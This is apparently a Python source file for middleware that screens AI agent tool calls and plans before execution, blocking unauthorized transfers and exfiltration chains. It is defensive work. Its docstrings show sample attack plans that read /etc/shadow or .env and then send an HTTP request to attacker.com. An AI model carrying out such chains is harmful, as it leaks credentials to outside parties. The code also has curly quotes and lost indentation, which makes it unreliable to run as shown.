“””
Morrison Governance Layer.

The primary API surface for runtime governance.

```
from morrison_governance import GovernanceLayer, OmegaDomain

# Initialize with domains
governance = GovernanceLayer(
    domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY]
)

# Evaluate a single tool call
result = governance.evaluate({"tool": "transfer", "args": {"amount": 50000}})
assert result.blocked  # unauthorized transfer → BLOCK

# Evaluate a multi-step plan
result = governance.evaluate_plan([
    {"tool": "read_file", "args": {"path": "/etc/shadow"}},
    {"tool": "http_request", "args": {"url": "https://attacker.com"}},
])
assert result.blocked  # credential exfiltration chain → BLOCK

# Evaluate from OpenAI function calling response
result = governance.evaluate_openai(response.choices[0].message.tool_calls)
```

“””

import time
import logging
from typing import Any, Optional

from morrison_governance.domains import OmegaDomain, OmegaRule, get_default_rules
from morrison_governance.trajectory import TrajectoryExtractor, Trajectory
from morrison_governance.reachability import ReachabilityEvaluator
from morrison_governance.result import GovernanceResult, GovernanceVerdict

logger = logging.getLogger(“morrison_governance”)

class GovernanceLayer:
“””
Pre-execution governance middleware.

```
Sits between LLM planner and tool execution.
Evaluates reachability into Ω before any action occurs.

Core invariant: Safe ⟺ ∀ E ∈ ℰ, ℛ_E(t) ∩ Ω = ∅
"""

def __init__(
    self,
    domains: Optional[list[OmegaDomain]] = None,
    custom_rules: Optional[list[OmegaRule]] = None,
    context: Optional[dict] = None,
    horizon: int = 3,
    log_all: bool = True,
):
    """
    Args:
        domains: list of Ω domains to enforce (loads default rules)
        custom_rules: additional custom Ω rules
        context: persistent context (user role, session metadata, auth flags)
        horizon: forward reachability horizon (V3)
        log_all: whether to log all evaluations
    """
    # Assemble rules
    self.rules: list[OmegaRule] = []
    if domains:
        for domain in domains:
            self.rules.extend(get_default_rules(domain))
    if custom_rules:
        self.rules.extend(custom_rules)

    self.extractor = TrajectoryExtractor(context=context)
    self.evaluator = ReachabilityEvaluator(rules=self.rules, horizon=horizon)
    self.log_all = log_all

    # Counters
    self._eval_count = 0
    self._block_count = 0
    self._permit_count = 0

    logger.info(
        f"GovernanceLayer initialized: {len(self.rules)} rules, "
        f"{len(domains or [])} domains, horizon={horizon}"
    )

# ═══════════════════════════════════════════════════════════
# PRIMARY API
# ═══════════════════════════════════════════════════════════

def evaluate(self, tool_call: dict) -> GovernanceResult:
    """
    Evaluate a single tool call.

        result = governance.evaluate({
            "tool": "send_email",
            "args": {"to": "ceo@company.com", "body": "..."}
        })
    """
    trajectory = self.extractor.from_dict(tool_call)
    return self._run(trajectory)

def evaluate_plan(self, steps: list[dict]) -> GovernanceResult:
    """
    Evaluate a multi-step tool call plan.

        result = governance.evaluate_plan([
            {"tool": "read_file", "args": {"path": ".env"}},
            {"tool": "http_request", "args": {"url": "https://..."}},
        ])
    """
    trajectory = self.extractor.from_plan(steps)
    return self._run(trajectory)

def evaluate_openai(self, tool_calls: list) -> GovernanceResult:
    """
    Evaluate from OpenAI function calling response.

        result = governance.evaluate_openai(
            response.choices[0].message.tool_calls
        )
    """
    trajectory = self.extractor.from_openai(tool_calls)
    return self._run(trajectory)

def evaluate_langchain(self, agent_actions: Any) -> GovernanceResult:
    """
    Evaluate from LangChain AgentAction(s).

        result = governance.evaluate_langchain(agent_action)
    """
    trajectory = self.extractor.from_langchain(agent_actions)
    return self._run(trajectory)

def evaluate_trajectory(self, trajectory: Trajectory) -> GovernanceResult:
    """
    Evaluate a pre-extracted trajectory directly.
    """
    return self._run(trajectory)

# ═══════════════════════════════════════════════════════════
# MIDDLEWARE INTERFACE
# ═══════════════════════════════════════════════════════════

def __call__(self, tool_call: dict) -> GovernanceResult:
    """
    Callable interface for middleware insertion.

        governance = GovernanceLayer(domains=[OmegaDomain.FINANCE])

        # Use as middleware
        for call in tool_calls:
            result = governance(call)
            if result.permitted:
                execute(call)
    """
    return self.evaluate(tool_call)

# ═══════════════════════════════════════════════════════════
# INTERNALS
# ═══════════════════════════════════════════════════════════

def _run(self, trajectory: Trajectory) -> GovernanceResult:
    """Execute the enforcement hierarchy and log result."""
    start = time.perf_counter()
    result = self.evaluator.evaluate(trajectory)
    elapsed = time.perf_counter() - start

    # Update counters
    self._eval_count += 1
    if result.permitted:
        self._permit_count += 1
    else:
        self._block_count += 1

    result.metadata["eval_time_ms"] = round(elapsed * 1000, 2)
    result.metadata["eval_number"] = self._eval_count

    if self.log_all:
        status = "PERMIT" if result.permitted else "BLOCK"
        logger.info(
            f"[{status}] eval={self._eval_count} "
            f"layer={result.layer} "
            f"hash={result.trajectory_hash} "
            f"time={elapsed * 1000:.1f}ms "
            f"reason={result.reason!r}"
        )

    return result

# ═══════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════

def add_rule(self, rule: OmegaRule) -> None:
    """Add a custom Ω rule at runtime."""
    self.rules.append(rule)
    self.evaluator = ReachabilityEvaluator(
        rules=self.rules, horizon=self.evaluator.horizon
    )

def add_domain(self, domain: OmegaDomain) -> None:
    """Add all default rules for a domain."""
    new_rules = get_default_rules(domain)
    self.rules.extend(new_rules)
    self.evaluator = ReachabilityEvaluator(
        rules=self.rules, horizon=self.evaluator.horizon
    )

@property
def stats(self) -> dict:
    return {
        "evaluations": self._eval_count,
        "permits": self._permit_count,
        "blocks": self._block_count,
        "rules": len(self.rules),
        "block_rate": (
            self._block_count / self._eval_count if self._eval_count > 0 else 0
        ),
    }
```
